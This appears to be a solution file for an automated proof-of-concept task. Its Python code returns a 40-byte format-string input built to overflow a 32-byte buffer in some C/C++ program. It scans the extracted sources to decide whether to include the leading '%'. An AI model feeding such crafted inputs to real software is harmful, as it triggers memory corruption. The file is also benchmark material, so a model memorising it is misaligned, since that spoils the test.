import os
import tarfile
import tempfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal heuristic: attempt to detect whether input likely expects a raw format string.
        # Default PoC is a 40-byte integer format exceeding 32-byte internal buffer.
        poc = b"%" + (b"9" * 19) + b"." + (b"9" * 18) + b"d"  # 40 bytes

        # Light-touch source peek (non-failing) to adjust for potential absence of leading '%'
        # If code constructs format string by prepending '%', then input likely omits it.
        try:
            with tempfile.TemporaryDirectory() as td:
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        tf.extractall(td)
                except Exception:
                    return poc

                combined = bytearray()
                max_read = 2_000_000
                for root, _, files in os.walk(td):
                    for fn in files:
                        if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hpp")):
                            continue
                        path = os.path.join(root, fn)
                        try:
                            with open(path, "rb") as f:
                                data = f.read(200_000)
                        except Exception:
                            continue
                        combined.extend(data)
                        if len(combined) >= max_read:
                            break
                    if len(combined) >= max_read:
                        break

                s = bytes(combined)
                # If we see patterns where code adds "%%" or "%%%" in format building,
                # prefer omitting leading '%' in input.
                if (b"\"%%" in s or b"'%'" in s) and (b"sprintf" in s or b"snprintf" in s):
                    # Alternative PoC: omit leading '%', keep length 40 by adding one more digit.
                    alt = (b"9" * 19) + b"." + (b"9" * 19) + b"d"  # 19+1+19+1=40
                    return alt
        except Exception:
            return poc

        return poc